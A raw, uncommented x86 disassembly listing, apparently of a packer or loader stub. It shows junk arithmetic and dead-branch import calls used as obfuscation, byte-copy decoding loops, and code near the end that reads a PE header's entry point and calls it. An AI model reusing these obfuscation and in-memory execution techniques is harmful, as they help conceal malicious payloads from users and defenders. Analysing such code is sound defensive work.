  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d6a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d66,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c56
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x423982
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c56
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e72
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c56
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42384f
  41bc20:	push   0x423883
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e72,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c56
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x4238ce
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x423883
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423946
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c56
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421ada,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421d2e,eax
  41c15b:	mov    eax,ds:0x421ada
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c56
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421d2e
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421ada
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c56
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c56
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c56
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421cda,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421cd2,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c56
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
